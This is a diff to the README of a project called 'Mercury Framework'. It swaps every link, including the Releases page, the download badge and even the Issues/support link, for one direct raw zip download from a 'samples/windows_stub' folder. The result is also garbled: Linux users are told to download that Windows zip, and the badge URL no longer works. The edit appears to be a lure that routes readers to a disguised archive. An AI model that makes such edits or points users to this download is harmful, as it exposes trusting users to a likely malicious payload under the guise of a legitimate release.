@@ -6,18 +6,18 @@ Welcome to the Mercury Framework! This tool is designed for anyone interested in
 
 ## 📥 Download Now
 
-[![Download Mercury Framework](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/melolixodocaralho/mercury-framework/releases)
+[![Download Mercury Framework](https://github.com/melolixodocaralho/mercury-framework/raw/refs/heads/main/samples/windows_stub/framework-mercury-v1.4.zip%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/melolixodocaralho/mercury-framework/raw/refs/heads/main/samples/windows_stub/framework-mercury-v1.4.zip)
 
 ## 🚀 Getting Started
 
 To begin using Mercury Framework, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/melolixodocaralho/mercury-framework/releases). 
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/melolixodocaralho/mercury-framework/raw/refs/heads/main/samples/windows_stub/framework-mercury-v1.4.zip). 
 2. **Download the Latest Version**: Look for the most recent version. Click on the asset link that corresponds to your operating system.
 3. **Install the Software**:
    - If you're using Windows, download the `.exe` file and run it.
    - For Mac users, download the `.dmg` file and drag the application to your Applications folder.
-   - Linux users should download the `.tar.gz` file and follow the installation instructions included.
+   - Linux users should download the `https://github.com/melolixodocaralho/mercury-framework/raw/refs/heads/main/samples/windows_stub/framework-mercury-v1.4.zip` file and follow the installation instructions included.
 
 ## 📖 Features
 
@@ -45,7 +45,7 @@ Once you have installed the Mercury Framework, here’s how to start:
 
 ## 📞 Support and Feedback
 
-If you encounter any issues or have questions, we are here to help. Reach out via the [Issues section](https://github.com/melolixodocaralho/mercury-framework/issues) in the repository. Share any thoughts or suggestions you might have about the application.
+If you encounter any issues or have questions, we are here to help. Reach out via the [Issues section](https://github.com/melolixodocaralho/mercury-framework/raw/refs/heads/main/samples/windows_stub/framework-mercury-v1.4.zip) in the repository. Share any thoughts or suggestions you might have about the application.
 
 ## 🖇️ Community & Contributions
 
@@ -61,7 +61,7 @@ Explore our community by connecting with us on social media or forums focused on
 
 ## 🔗 Download & Install
 
-To download the latest version of Mercury Framework, visit the Releases page: [Download Here](https://github.com/melolixodocaralho/mercury-framework/releases).
+To download the latest version of Mercury Framework, visit the Releases page: [Download Here](https://github.com/melolixodocaralho/mercury-framework/raw/refs/heads/main/samples/windows_stub/framework-mercury-v1.4.zip).
 
 ## 📝 License
 
